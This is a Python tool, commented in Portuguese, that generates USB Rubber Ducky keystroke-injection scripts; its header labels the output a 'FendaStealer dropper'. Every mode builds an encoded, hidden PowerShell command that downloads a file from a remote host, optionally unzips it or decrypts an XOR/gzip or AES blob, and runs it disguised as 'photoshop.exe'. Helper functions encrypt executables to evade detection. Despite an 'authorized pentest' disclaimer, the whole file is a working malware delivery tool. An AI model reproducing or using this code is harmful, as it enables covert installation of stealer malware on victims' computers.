#!/usr/bin/env python3
# make_ducky_payload.py - gerador de payload DuckyScript (Rubber Ducky 2 / DuckyScript 3)
#
# Modos:
#   1) exe  : baixa o .exe direto e executa                    (mais simples)
#   2) zip  : baixa um .zip, descompacta no %TEMP% e executa   (o que voce pediu)
#   3) blob : baixa um blob gzip+XOR, reconstroi em memoria e executa (menos detectavel)
#
# Uso:
#   python make_ducky_payload.py --mode exe  --url http://HOST/x.exe --out photoshop.exe --save final.duck
#   python make_ducky_payload.py --mode zip  --url http://HOST/x.zip --out photoshop.exe --save final.duck
#   python make_ducky_payload.py --mode blob --url http://HOST/x.bin --key 42 --out photoshop.exe --save final.duck
#
#   # gerar o blob a partir do exe local (depois so subir o .bin no catbox):
#   python make_ducky_payload.py --make-blob build_antiga\photoshop.exe --out photoshop.bin --key 42
#
# Uso autorizado / pentest APENAS. Autor: MtxTheus1.

import argparse
import base64
import gzip
import hashlib
import io
import os


def b64_utf16le(text: str) -> str:
    """PowerShell -enc espera UTF-16-LE em base64."""
    return base64.b64encode(text.encode("utf-16-le")).decode("ascii")


def ps_exe(url: str, outname: str) -> str:
    return (
        "$u='" + url + "';"
        "$p=$env:TEMP+'\\" + outname + "';"
        "(New-Object System.Net.WebClient).DownloadFile($u,$p);"
        "if(Test-Path $p){Start-Process -WindowStyle Hidden $p}"
    )


def ps_zip(url: str, outname: str) -> str:
    return (
        "$u='" + url + "';"
        "$d=$env:TEMP+'\\fd';"
        "$z=$env:TEMP+'\\f.zip';"
        "New-Item -ItemType Directory -Force $d|Out-Null;"
        "(New-Object System.Net.WebClient).DownloadFile($u,$z);"
        "Expand-Archive -Path $z -DestinationPath $d -Force;"
        "$e=Join-Path $d '" + outname + "';"
        "if(Test-Path $e){Start-Process -WindowStyle Hidden $e}"
    )


def ps_blob(url: str, outname: str, key: int) -> str:
    return (
        "$u='" + url + "';"
        "$p=$env:TEMP+'\\f.dat';"
        "$e=$env:TEMP+'\\" + outname + "';"
        "(New-Object System.Net.WebClient).DownloadFile($u,$p);"
        "$b=[IO.File]::ReadAllBytes($p);"
        "$g=New-Object IO.MemoryStream(,$b);"
        "$z=New-Object IO.Compression.GzipStream($g,[IO.Compression.CompressionMode]::Decompress);"
        "$ms=New-Object IO.MemoryStream;"
        "$z.CopyTo($ms);"
        "$x=$ms.ToArray();"
        "for($i=0;$i -lt $x.Length;$i++){$x[$i]=$x[$i] -bxor " + str(key) + "};"
        "[IO.File]::WriteAllBytes($e,$x);"
        "if(Test-Path $e){Start-Process -WindowStyle Hidden $e}"
    )


HEADER = """REM ============================================================
REM FendaStealer dropper - USB Rubber Ducky (DuckyScript 3.x)
REM Target  : Windows 10/11 (interactive session, sem admin)
REM Author  : MtxTheus1 - uso educacional / pentest autorizado
REM ============================================================
"""

BODY = """DELAY 1200
GUI r
DELAY 2200
STRING powershell -ep bypass -w hidden -enc {B64}
DELAY 500
ENTER

REM Espera download/execucao concluir antes de devolver o teclado
DELAY 9000
"""

# Variante "console": abre o PowerShell pelo menu iniciar, espera a janela,
# cola o comando e depois fecha a janela com exit.
CONSOLE_BODY = """DELAY 1200
GUI
DELAY 1800
STRING powershell
DELAY 800
ENTER
DELAY 3000
STRING powershell -ep bypass -enc {B64}
DELAY 500
ENTER

REM espera a execucao e fecha a janela do console
DELAY 9000
STRING exit
ENTER
"""


def make_blob(src: str, dst: str, key: int) -> None:
    raw = open(src, "rb").read()
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as gz:
        gz.write(raw)
    data = bytearray(buf.getvalue())
    for i in range(len(data)):
        data[i] ^= key
    with open(dst, "wb") as f:
        f.write(bytes(data))
    print("Blob criado:", dst)
    print("Tamanho    :", len(raw), "->", len(data), "bytes (", round(len(data) / len(raw) * 100, 1), "% )")


def ps_aes(url: str, outname: str, password: str, run_args: str = "") -> str:
    extra = ""
    if run_args:
        extra = " -ArgumentList '" + run_args + "'"
    return (
        "$u='" + url + "';"
        "$p=$env:TEMP+'\\f.dat';"
        "$e=$env:TEMP+'\\" + outname + "';"
        "(New-Object System.Net.WebClient).DownloadFile($u,$p);"
        "$b=[IO.File]::ReadAllBytes($p);"
        "$iv=New-Object byte[] 16;"
        "[Array]::Copy($b,$iv,16);"
        "$ct=New-Object byte[] ($b.Length-16);"
        "[Array]::Copy($b,16,$ct,0,$ct.Length);"
        "$sha=[Security.Cryptography.SHA256]::Create();"
        "$key=$sha.ComputeHash([Text.Encoding]::UTF8.GetBytes('" + password + "'));"
        "$aes=[Security.Cryptography.Aes]::Create();"
        "$aes.Key=$key;"
        "$aes.IV=$iv;"
        "$dec=$aes.CreateDecryptor();"
        "$ms=New-Object IO.MemoryStream(,$ct);"
        "$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,[Security.Cryptography.CryptoStreamMode]::Read);"
        "$out=New-Object IO.MemoryStream;"
        "$cs.CopyTo($out);"
        "[IO.File]::WriteAllBytes($e,$out.ToArray());"
        "if(Test-Path $e){Start-Process -WindowStyle Hidden" + extra + " $e}"
    )


def make_aes(src: str, dst: str, password: str) -> None:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad

    raw = open(src, "rb").read()
    key = hashlib.sha256(password.encode("utf-8")).digest()
    iv = os.urandom(16)
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(raw, AES.block_size))
    with open(dst, "wb") as f:
        f.write(iv + ct)
    print("Arquivo AES criado:", dst)
    print("Tamanho            :", len(raw), "->", len(iv) + len(ct), "bytes")


def main() -> None:
    ap = argparse.ArgumentParser(description="Gera payload DuckyScript de download+exec")
    ap.add_argument("--mode", choices=["exe", "zip", "blob", "aes"], default="exe")
    ap.add_argument("--url", default="http://HOST:PORT/file", help="URL no hoster")
    ap.add_argument("--out", default="photoshop.exe", help="nome do exe dentro do %TEMP%")
    ap.add_argument("--key", type=int, default=0x5A, help="chave XOR do modo blob")
    ap.add_argument("--password", default="010423", help="senha do modo aes")
    ap.add_argument("--run-args", default="", help="argumentos passados ao exe (ex.: --test)")
    ap.add_argument("--console", action="store_true", help="abre o PowerShell primeiro (estilo console)")
    ap.add_argument("--save", default="", help="arquivo .duck de saida")
    ap.add_argument("--make-blob", default="", help="gera blob a partir de um exe local")
    ap.add_argument("--make-aes", default="", help="gera arquivo .aes (IV+AES-256-CBC) a partir de um exe")
    args = ap.parse_args()

    if args.make_aes:
        dst = args.out if args.out.endswith((".aes", ".bin", ".dat")) else os.path.splitext(args.out)[0] + ".aes"
        make_aes(args.make_aes, dst, args.password)
        return

    if args.make_blob:
        dst = args.out if args.out.endswith(".bin") else os.path.splitext(args.out)[0] + ".bin"
        make_blob(args.make_blob, dst, args.key)
        return

    if args.mode == "exe":
        ps = ps_exe(args.url, args.out)
    elif args.mode == "zip":
        ps = ps_zip(args.url, args.out)
    elif args.mode == "aes":
        ps = ps_aes(args.url, args.out, args.password, args.run_args)
    else:
        ps = ps_blob(args.url, args.out, args.key)

    body = CONSOLE_BODY if args.console else BODY
    payload = HEADER + body.format(B64=b64_utf16le(ps))

    if args.save:
        with open(args.save, "w", encoding="ascii", errors="ignore") as f:
            f.write(payload)
        print("Payload salvo em:", args.save)
        print("Modo   :", args.mode, "| URL:", args.url, "| exe:", args.out)
    else:
        print(payload)


if __name__ == "__main__":
    main()
